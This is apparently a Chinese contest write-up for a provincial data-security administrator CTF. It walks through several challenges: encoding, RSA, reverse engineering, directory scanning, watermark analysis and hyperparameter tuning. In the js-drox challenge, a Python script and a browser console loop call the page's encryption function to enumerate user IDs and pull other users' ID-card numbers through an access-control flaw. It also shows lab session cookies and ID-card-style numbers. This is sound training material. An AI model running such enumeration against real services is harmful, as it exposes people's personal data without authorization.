# 湖南省第二届职工数字化应用技术技能大赛-数据安全管理员赛项选拔赛-科目二-wp

> 原文: https://www.ctfiot.com/272179.html
> ID: 272179

附件下载

题目涉及附件请关注微信公众号”无尽信安”回复“数据安全管理员”下载

文章目录：

✅b.zip

✅RSA_LCG.zip

poem.rar

✅ds_re5

✅bmm_web_20250807

✅js-drox

✅model_regularization_tuning_user

✅数据分析1

✅数据分析2

✅b.zip

分析题目，提交王想的身份证号码。

附件：b.zip

flag：140825195506302668

打开文件发现一个字符串，直接用随波逐流的ctf编码工具一键解密即可

发现是base16编码

✅RSA_LCG.zip

分析题目，提交获取到的标识字符串进行提交。

附件：RSA_LCG.zip

flag：2c532af14547ff78756d2695d11787af

现场用本地qwen3:0.6b 解不出来，复盘时用腾讯元宝的DeepSeek可解

poem.rar

附件：poem.rar

我司网络安全团队在一次例行审计中，发现了一个可疑的图片文件 poem.png。初步分析显示，该图片看似普通，但我们的情报显示这很可能是一种巧妙的数据隐藏技术。据调查，原本应该还有一个配套的文本文件 poem.txt，但该文件在发现前已经不翼而飞。我们只能依靠现有的图片文件来破解这个谜题。

复盘都没看出来这是个啥

✅ds_re5

分析程序实现的数据脱敏功能，具体任务见附件中“题目说明.docx”

附件：ds_re5.rar

复盘时朋友用IDA逆向，然后借助ai分析核心代码解出来的

✅bmm_web_20250807

某企业数据安全团队在对公司网站进行安全评估时，发现可能存在数据泄露风险。作为数据安全分析师，您需要通过技术手段来识别被禁止访问的敏感路径。例:
发现路径 /upload/，则提交：/upload/

flag：/tjhack/

打开网页，看源代码就加载了一个css，登录框传入任意字符都没反应，接口也是指向自己

直接使用dirsearch扫描发现robots.txt

✅js-drox

某公司上线了一套号称“高度安全”的数据传输系统，所有请求数据都会在前端经过加密再发送，看上去几乎无法被篡改。你注册并登录后发现系统中有一个「查询用户信息」的接口，其请求体被前端 JS 模块加密，解密逻辑也被隐藏在代码中。然而，开发人员却忽视了权限控制的实现，你能否绕过这层“安全保护”，成功获取“王成”的身份证号？

flag:
350122199703073498

给了两个账号登录后台，后台有个功能点可以查看用户信息，其中包含身份证

请求体

{"timestamp":
1758420734,"user_id":
1001,"data":"VtjTr5gaWd0vs7uWu6g4gGNXWjE1VWLKFfga4Np1OK+s9bb3iDz3Zs3owyXlYhal"}

响应体

{
  "data": {
    "balance": "11469.07",
    "id_card": "433126197809254675",
    "name": "u6768u4e3du4e3d",
    "phone": "18660020548",
    "user_id": 1001
  },
  "success": true
}

经过测试发现可以重放，但是改user_id出现解密异常

控制台通过栈跟踪寻找加密函数

确定加密函数后

方法一：使用jsrpc进行远程调试，调用加密函数进行枚举

import time
import json
import requests

def poc_zzOdW(url, data):
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "113",
        "Content-Type": "application/json",
        "Cookie": "session=.eJyrVspLzE1VslKKKTUzN7OIKTVJNU6BkEo6SqXFqUXxmSlKVoYGBoYQLlR5Yk5mcqpSLQBsohOt.aM9e4Q.A5GVEClD96G4m6b14iQU8TnF5jo",
        "Host": "172.20.123.23:
18284",
        "Origin": "http://172.20.123.23:
18284",
        "Referer": "http://172.20.123.23:
18284/dashboard",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
    }
    res = requests.post(url=url, headers=headers, data=json.dumps(
        data), verify=False, proxies={
        "http": "http://127.0.0.1:
8083",
                "https": "https://127.0.0.1:
8083"
    })
    return res.json()

if __name__ == '__main__':

    for user_id in range(1019, 2000):
        timestamp = time.time()
        requestData = {
            "user_id": user_id,
            "action": "query"
        }
        js_code = """
    (function(){"""+"""
    const aa = encryptData(JSON.stringify("""+str(requestData)+"""), """+str(user_id)+""", """+str(timestamp)+""");
        console.log(aa)
        return aa"""+"""
    })()

        """
        data1 = {
            "group": "zzz",
            "code": js_code
        }
        try:
            res_data = requests.post("http://localhost:
12080/execjs", data=data1)
            encryptedData = res_data.json()
            print(f"浏览器:{encryptedData}")
            data = {"timestamp": timestamp, "user_id": user_id,
                    "data": encryptedData['data']}
        
except Exception as e:
            print(f"[-]user_id:{user_id}")
            with open("err.txt", 'a')as f:
                f.write(f"{user_id}n")
                f.close()

        url = "http://172.20.123.23:
18284/api/userinfo"
        res_dict = poc_zzOdW(url, data)
        res = str(res_dict)
        print(f"服务器：{res}")
        if"王成"in res:
            break

法二：赛后复盘才反应过来，这js也没混淆，函数就那么几个，其实是可以直接控制台写for循环的，现场用jsrpc+python纯纯浪费时间，蠢哭了，3秒的活干了30分钟

for (let i = 1001; i <= 2000; i++) {
  queryUserInfo(i)
}

✅model_regularization_tuning_user

请选手使用ssh连接环境，尝试训练与验证模型性能。执行训练脚本（train.py）与模型性能验证脚本（evaluate_model.py），并反复训练并尝试修改调优超参数的正则化，使得模型性能验证脚本（evaluate_model.py）最终得出的准确率结果为0.982805。正则化的取值范围为：0.1-100，最多取一位小数。最终将符合准确率结果的正则化超参数值作为答案提交。【详情参见附件任务书】

附件：7.zip、任务书-模型正则化调优.pdf

之前没接触后，一开始也没仔细看，以为难得很，复盘是才发现，把两脚本综合一下针对参数c写个for循环就搞定了

不过不知道为啥用二分法不行，最后从0.1开始穷举完成的

完整脚本附件：77.zip

✅数据分析1

“请分析泄露的文件和公司机密文件，找出是哪些机密文件遭到了泄露，将泄露文件与公司机密文件一一对应。

【评测标准】 本题答案位32位小写md5。

请将分析得到的结果整理成如”泄露文件名-公司机密文件名“的字符串，将所有结果按照泄露文件名中数字从小到大进行排序，排序结果使用”-“连接，最后转为32位小写md5提交，注意计算md5时，输入字符应为UTF-8编码且行尾不带换行符。”

附件：wjxl.zip

在现场没想到所有问泄露文件都是能对应上了，所以思路是u截断后面的水印计算md5和公司机密文件进行对比，结果死活不对

出来后朋友告诉思路错了，应该

取前30个字符 然后把标点符号 空格 tab 都删了再进行匹配

解密脚本：88.zip

✅数据分析2

“请分析泄露的文件，尝试将水印解码后获取公司名称，得到各个文件泄露的源头。

【评测标准】 本题答案为32位小写md5。

请将泄露文件与公司名称进行对应，拼接成如”泄露文件名-公司名称“的字符串，将所有结果按照泄露文件名中数字从小到大进行排序，排序结果使用”-“连接，最后转为32位小写md5提交，注意计算md5时，输入字符应为UTF-8编码且行尾不带换行符。”

附件：wjxl.zip

读取泄密文件，转Unicode编码，提取ufeff 和 u200b

将这两个不可见字符替换为1和0，二进制转字符串 得base64 解码获得公司名

附件：99.py

总结

比赛经验不足，很多操作步骤上浪费了太多时间，菜鸡还得多练

附件下载

题目涉及附件请关注微信公众号”无尽信安”回复“数据安全管理员”下载


```
{"timestamp":
1758420734,"user_id":
1001,"data":"VtjTr5gaWd0vs7uWu6g4gGNXWjE1VWLKFfga4Np1OK+s9bb3iDz3Zs3owyXlYhal"}
{
  "data": {
    "balance": "11469.07",
    "id_card": "433126197809254675",
    "name": "u6768u4e3du4e3d",
    "phone": "18660020548",
    "user_id": 1001
  },
  "success": true
}
import time
import json
import requests

def poc_zzOdW(url, data):
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "113",
        "Content-Type": "application/json",
        "Cookie": "session=.eJyrVspLzE1VslKKKTUzN7OIKTVJNU6BkEo6SqXFqUXxmSlKVoYGBoYQLlR5Yk5mcqpSLQBsohOt.aM9e4Q.A5GVEClD96G4m6b14iQU8TnF5jo",
        "Host": "172.20.123.23:
18284",
        "Origin": "http://172.20.123.23:
18284",
        "Referer": "http://172.20.123.23:
18284/dashboard",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
    }
    res = requests.post(url=url, headers=headers, data=json.dumps(
        data), verify=False, proxies={
        "http": "http://127.0.0.1:
8083",
                "https": "https://127.0.0.1:
8083"
    })
    return res.json()

if __name__ == '__main__':

    for user_id in range(1019, 2000):
        timestamp = time.time()
        requestData = {
            "user_id": user_id,
            "action": "query"
        }
        js_code = """
    (function(){"""+"""
    const aa = encryptData(JSON.stringify("""+str(requestData)+"""), """+str(user_id)+""", """+str(timestamp)+""");
        console.log(aa)
        return aa"""+"""
    })()

        """
        data1 = {
            "group": "zzz",
            "code": js_code
        }
        try:
            res_data = requests.post("http://localhost:
12080/execjs", data=data1)
            encryptedData = res_data.json()
            print(f"浏览器:{encryptedData}")
            data = {"timestamp": timestamp, "user_id": user_id,
                    "data": encryptedData['data']}
        
except Exception as e:
            print(f"[-]user_id:{user_id}")
            with open("err.txt", 'a')as f:
                f.write(f"{user_id}n")
                f.close()

        url = "http://172.20.123.23:
18284/api/userinfo"
        res_dict = poc_zzOdW(url, data)
        res = str(res_dict)
        print(f"服务器：{res}")
        if"王成"in res:
            break
for (let i = 1001; i <= 2000; i++) {
  queryUserInfo(i)
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122913-wxsync-2025-09-0c7a4bd39815ea6e90d207966cb914cc.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122915-wxsync-2025-09-26ebd2353f58a85f38e9f29cd271bb74.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122917-wxsync-2025-09-045e14a6fdefacf83d3378fb40997183.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122919-wxsync-2025-09-6de0762c78c58818476b8f06a9fae956.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122921-wxsync-2025-09-7755f7ca3a172a2eb774b53f06237b4e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122923-wxsync-2025-09-0aa13589fbcda511e670d2ccd15da40f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122925-wxsync-2025-09-94e237d84aa09165e7c877d03fb94001.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122927-wxsync-2025-09-cd2f2b10d5414db0a96df4d2f609b69f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122929-wxsync-2025-09-855b7851d54a33f429879f70b8fab8a2.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759122931-wxsync-2025-09-e14fa5f966c74d35830f10f1381a1e1b.png)